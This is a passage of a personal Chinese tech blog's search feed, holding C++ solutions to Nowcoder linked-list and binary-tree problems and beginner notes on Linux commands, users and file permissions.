      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查看链表是否有环</title>
    <link href="/2023/05/01/%E7%AE%97%E6%B3%95/newcoder/%E6%9F%A5%E7%9C%8B%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF/"/>
    <url>/2023/05/01/%E7%AE%97%E6%B3%95/newcoder/%E6%9F%A5%E7%9C%8B%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/650474f313294468a4ded3ce0f7898b9?tpId=295&tqId=605&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj?page=1&tab=%E7%AE%97%E6%B3%95%E7%AF%87&topicId=295">判断链表中是否有环_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            fast = fast-&gt;next-&gt;next;<br>            slow = slow-&gt;next;<br>            <span class="hljs-keyword">if</span> (fast == slow) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>使用快慢指针，如果快指针与慢指针重合，则说明有环</li></ul></li><li><p>理解</p><p>- </p></li><li><p>问题</p><p>- </p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用linux</title>
    <link href="/2023/04/30/linux/%E4%BD%BF%E7%94%A8linux/"/>
    <url>/2023/04/30/linux/%E4%BD%BF%E7%94%A8linux/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="使用Linux"><a href="#使用Linux" class="headerlink" title="使用Linux"></a>使用Linux</h1><h2 id="各类小技巧"><a href="#各类小技巧" class="headerlink" title="各类小技巧"></a>各类小技巧</h2><ol><li><p>强制停止</p><ul><li><p><code>Ctrl+c</code> 退出程序</p></li><li><p><code>Ctrl+c</code> 退出登出或退出</p></li></ul><p>  不能用于退出vi&#x2F;vim</p></li><li><p>历史命令查找</p><ul><li><p><code>history</code> </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> ch<br></code></pre></td></tr></table></figure><p>过滤使用的指令里带有<code>ch</code>的命令</p></li><li><p><code>Ctrl+r</code> 输入内容匹配</p><p>如果搜索到的命令是可执行的，则直接回车</p><p>键盘的左右键，可以得到此命令</p></li><li><p><code>!</code> 匹配最近的</p><p>比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">!<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>匹配最近的p开头的命令</p></li></ul></li><li><p>光标移动</p><ul><li><code>Ctrl + a</code> 跳到命令开头</li><li><code>Ctrl + e</code> 跳到命令结尾</li><li><code>Ctrl + 左键</code> 向左跳过一个单词</li><li><code>Ctrl + 右键</code> 向右跳过一个单词</li></ul></li><li><p>清屏</p><ul><li><code>Ctrl + r</code>&#x2F;<code>clean</code></li></ul></li></ol><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="CentOs"><a href="#CentOs" class="headerlink" title="CentOs"></a><code>CentOs</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/yum.png"></p><p><code>yum</code>指令 </p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><code>Ubuntu</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/apt.png"></p><h2 id="控制软件的启动和关闭"><a href="#控制软件的启动和关闭" class="headerlink" title="控制软件的启动和关闭"></a>控制软件的启动和关闭</h2><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/systemctl.png"></p><p>控制系统的内置服务</p><p>手动添加第三方软件到<code>systemctl</code></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>在系统中创建软连接，可以直接将文件、文件夹放到其他位置，类似于win的快捷方式</p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><ol><li><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> -s 参数<span class="hljs-number">1</span> 参数<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>参数1：被链接的文件或者文件夹</p><p>参数2：要链接的目的地</p></li></ol><h2 id="时间和时区"><a href="#时间和时区" class="headerlink" title="时间和时区"></a>时间和时区</h2><ol><li><p>语法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data [-d] [+格式化字符串]<br></code></pre></td></tr></table></figure><ul><li><p><code>-d</code> 按照给定的字符串显示日期，一般用于日期的计算</p></li><li><p>格式化字符串</p><p>通过特定的字符串标记，用来控制显示 的日期</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%97%A5%E6%9C%9F.png"></p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\linux\使用linux.assets\image-20230501234712440.png"></p></li></ul></li></ol><h2 id="IP地址、主机名"><a href="#IP地址、主机名" class="headerlink" title="IP地址、主机名"></a>IP地址、主机名</h2><ol><li><p>IP和主机名</p><p><code>ip</code>使用<code>ifconfig</code></p><p>主机名 <code>hostname</code></p></li><li><p>域名解析</p><p>通过主机名找到对应的IP  </p></li><li><p>设置固定<code>IP</code></p></li></ol><h2 id="网络传输"><a href="#网络传输" class="headerlink" title="网络传输"></a>网络传输</h2><ol><li><p><code>ping</code></p><p>检查是否可以来连通</p><p><code>ping [-c num]</code> op或者主机名</p><p><code>-c</code>用于检查次数，不然会无限检查</p></li><li><p><code>wget</code></p><p>下载网络文件</p><p><code>wget [ -b ] url</code> </p><p>b是后台下载</p></li><li><p><code>curl +IP/域名</code></p><p>发起网络请求</p><ul><li><p>使用<code>curl cip.cc</code></p><p>查看当前主机的ip</p></li><li><p>使用选项<code>-O</code>下载</p></li></ul></li></ol><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><ol><li><p>IP只能代表某一个具体的电脑，不能锁定程序</p></li><li><p>总共有<code>65535</code>个端口</p></li><li><p>公认端口<code>1~1023</code></p></li><li><p>注册端口<code>1024~49151</code>，随意使用</p></li><li><p>动态端口<code>49152,65535</code>，不会绑定程序，而是当程序对外网连接时，用于临时用</p></li><li><p><code>nmap</code>查看端口的占用情况</p><p><code>nmap + IP</code>查看哪些端口是对外链接的 </p></li><li><p><code>netstat</code>查看端口的占用情况</p><p><code>netstat -anp | grep 端口号</code></p><p>查看端口的占用情况</p></li><li><p><code>ss</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo ss -tlnp</span><br></code></pre></td></tr></table></figure><p>该命令与 netstat 的作用相同，也是显示当前正在监听的 TCP 端口和与之关联的进程信息，其中：</p><ul><li><code>-t</code> 参数表示只显示 TCP 协议相关的信息；</li><li><code>-l</code> 参数表示只显示正在监听的端口；</li><li><code>-n</code> 参数表示以数字形式显示端口号，而不是服务名称；</li><li><code>-p</code> 参数表示同时显示进程 ID 和进程名。</li></ul></li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ol><li><p>查看进程</p><p><code>ps [-e -f]</code></p><p><code>-e</code>展现全部信息</p><p><code>-f</code>以格式化的方式是展示</p></li><li><p>关闭进程</p><p><code>kill [-9] 进程ID</code></p><p><code>-9</code>表示强制关闭</p></li></ol><h2 id="主机状态"><a href="#主机状态" class="headerlink" title="主机状态"></a>主机状态</h2><h3 id="查看系统资源"><a href="#查看系统资源" class="headerlink" title="查看系统资源"></a>查看系统资源</h3><ol><li><p><code>top</code></p><p>查看<code>cpu</code>的使用情况</p></li><li><p><code>df</code>查看磁盘使用情况</p></li><li><p><code>iostat</code></p><p>查看cpu,磁盘信息  </p><p>使用<code>-x</code>显示更多的信息</p></li><li><p><code>sar -n DEV num1 num2</code></p><p><code>-n</code>查看网络</p><p><code>DEV</code>查看网络接口</p><p><code>num1</code> 刷新间隔</p><p><code>num2</code>查看次数</p></li></ol><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><ol><li><p>查看环境变量</p><p><code>env</code></p></li><li><p>临时设置环境变量</p><p><code>export 变量名=变量值</code></p></li><li><p>永久有效</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E9%85%8D%E7%BD%AE.png"></p><ul><li>针对用户</li><li>全局有效</li><li>使用<code>source </code>让其有效</li></ul></li></ol><h2 id="解压和压缩"><a href="#解压和压缩" class="headerlink" title="解压和压缩"></a>解压和压缩</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>针对<code>.tar</code>和<code>.gz</code>的压缩文件</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar.png"></p><ul><li><p>压缩</p><p><code>tar -cvf test.tar 1.txt</code>将<code>1.txt</code>文件压缩到<code>test.tar</code>文件</p><p><code>tar -zcvf test.tar.gz 1.txt</code>将<code>1.txt</code>压缩到<code>test.tar.gz</code>文件内，使用<code>gzip</code>的模式</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar%E5%8E%8B%E7%BC%A9.png"></p></li><li><p>解压</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar%E8%A7%A3%E5%8E%8B.png"></p></li></ul><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><ul><li><p>压缩</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/zip%E7%9A%84%E5%8E%8B%E7%BC%A9.png"></p></li><li><p>解压</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/unzip%E8%A7%A3%E5%8E%8B.png"></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表中的节点每k个一组翻转</title>
    <link href="/2023/04/26/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC/"/>
    <url>/2023/04/26/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/b49c3dc907814e9bbfa8437c251b028e?tpId=295&tqId=722&ru=/exam/intelligent&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/intelligent?questionJobId=10&tagId=21000">链表中的节点每k个一组翻转_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param k int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseKGroup</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <span class="hljs-keyword">auto</span> headTem = <span class="hljs-keyword">new</span> ListNode&#123;<span class="hljs-number">0</span>&#125;;<br>        headTem-&gt;next = head;<br><br>        std::vector&lt;ListNode*&gt; vector;<br>        <span class="hljs-keyword">auto</span> moveNode = head;<br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">nullptr</span>) &#123;<br>            vector.<span class="hljs-built_in">push_back</span>(moveNode);<br>            moveNode = moveNode-&gt;next;<br>            i++;<br>            vector.<span class="hljs-built_in">back</span>()-&gt;next = <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">if</span> (i % k == <span class="hljs-number">0</span>) &#123;<br>                std::<span class="hljs-built_in">reverse</span>(vector.<span class="hljs-built_in">begin</span>() + i - k, vector.<span class="hljs-built_in">begin</span>() + i );<br>            &#125;<br><br>        &#125;<br>        moveNode = headTem;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : vector) &#123;<br>            moveNode-&gt;next = item;<br>            moveNode = item;<br>        &#125;<br>        <span class="hljs-keyword">return</span> headTem-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>使用<code>reverse</code>函数对<code>vector</code>进行翻转</li></ul></li><li><p>理解</p><p>- </p></li><li><p>问题</p><ul><li><p>为什么要使用<code>vector</code></p><blockquote><p>因为使用链表的操作太过于复杂</p></blockquote></li><li><p>33行是为什么？</p><blockquote><p>使得调试的时候方便看结点，这样就只会显示一个节点</p></blockquote></li></ul></li><li><p>注意</p><ul><li><p>迭代器的用法，特别是begin()，和end()</p></li><li><p><code>reverse(迭代器1，迭代器2)</code>函数的用法</p><blockquote><p>将2之前的反转，并不会包括2</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用户和权限</title>
    <link href="/2023/04/26/linux/%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90/"/>
    <url>/2023/04/26/linux/%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="用户和权限"><a href="#用户和权限" class="headerlink" title="用户和权限"></a>用户和权限</h1><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><ol><li><p><code>su</code></p><p>切换用户</p><ul><li><p><code>su - -root</code></p><p>注意中间的<code>-</code> 前后都有空格</p></li></ul></li><li><p><code>exit</code></p><p>退出返回上一个用户</p></li><li><p><code>sudo</code></p><p>普通用户获得普通的权限，但不是所有的用户都有<code>sudo</code>认证，需要认证</p></li></ol><h2 id="用户用户组"><a href="#用户用户组" class="headerlink" title="用户用户组"></a>用户用户组</h2><ol><li>一个用户可以在多个用户组</li></ol><h3 id="用户组的管理"><a href="#用户组的管理" class="headerlink" title="用户组的管理"></a>用户组的管理</h3><ol><li><p>用户组的创建</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">groupadd` 用户组名<br></code></pre></td></tr></table></figure></li><li><p>删除用户组</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">groupdel</span> 用户组名<br></code></pre></td></tr></table></figure></li></ol><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86.png"></p><ul><li><p><code>getent passwd</code></p><p>查看当前系统中有哪些用户</p></li></ul><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%83%E9%99%90.png"></p><ol><li><p><code>chmod</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> -R 权限 文件或者文件夹<br></code></pre></td></tr></table></figure><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/chmod.png"></p><p>使用<code>-R</code>代表将文件夹里面的也一并修改</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">751</span> 文件或者文件夹<br></code></pre></td></tr></table></figure><ul><li>7代表给用户的</li><li>5代表给用户组的权利</li><li>1代表给其他的权利</li></ul><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E6%95%B0%E5%AD%97%E6%9D%83%E9%99%90.png"></p></li><li><p><code>chown</code>修改所属的用户、用户组</p><p>该命令只针对于<code>root</code>用户</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/chown.png"></p><ul><li><p>只修改用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown <span class="hljs-keyword">user</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li><li><p>只修改用户组</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown :<span class="hljs-keyword">group</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li><li><p>两个都修改</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown user:<span class="hljs-keyword">group</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从中序与后序遍历序列构造二叉树</title>
    <link href="/2023/04/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/04/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/ab8dde7f01f3440fbbb7993d2411a46b?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">从中序与后序遍历序列构造二叉树_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct TreeNode *left;</span><br><span class="hljs-comment"> *  struct TreeNode *right;</span><br><span class="hljs-comment"> *  TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-type">int</span> indexMap;<span class="hljs-comment">//根节点的在后序遍历的下标</span><br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; unorderedMap;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param inorder int整型vector 中序遍历序列</span><br><span class="hljs-comment">     * @param postorder int整型vector 后序遍历序列</span><br><span class="hljs-comment">     * @return TreeNode类</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-function">TreeNode *<span class="hljs-title">build</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;inorder, vector&lt;<span class="hljs-type">int</span>&gt; &amp;postorder, <span class="hljs-type">int</span> leftSub, <span class="hljs-type">int</span> rightSub)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (leftSub &gt; rightSub) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-keyword">auto</span> root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(postorder[indexMap]);<br>        <span class="hljs-keyword">auto</span> index = unorderedMap[postorder[indexMap]];<br>        indexMap--;<br>        root-&gt;right = <span class="hljs-built_in">build</span>(inorder, postorder, index + <span class="hljs-number">1</span>, rightSub);<br>        root-&gt;left = <span class="hljs-built_in">build</span>(inorder, postorder, leftSub, index - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        indexMap = postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : inorder) &#123;<br>            unorderedMap[item] = sub++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(inorder, postorder, <span class="hljs-number">0</span>, inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p>后序遍历的最后一个元素是<code>root</code>的<code>val</code></p></li><li><p>采取递归的方法，创建结点</p></li><li><p>注意创建的顺序，应该是先是右的再左的</p><p>因为创建的顺序应该是是从最小树开始创建</p></li></ul></li><li><p>理解</p><ul><li><pre><code class="c++">        for (const auto&amp; item : inorder) &#123;            unorderedMap[item] = sub++;        &#125;</code></pre><p>将&lt;元素，下标&gt;的方式存放数据</p><p>这样操作的原因是：方便的通过后序遍历找到<code>root</code>，再通过<code>map</code>查找数据</p></li><li><p>把每一个都当成一个<code>root</code></p></li></ul></li><li><p>问题</p><ul><li><p><code>leftSub &gt; rightSub</code></p><blockquote><p>当左节点的下标大于右节点的下标就表示这棵树是NULL</p><p>也就是说子串是无的</p></blockquote></li><li><p>为什么要先创建右节点</p><blockquote><p>因为我们的后序遍历顺序是:左-右-根</p><p>所以当我们把<code>root</code>取出剩下的应该就是右节点</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从中序与后序遍历序列构造二叉树</title>
    <link href="/2023/04/24/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
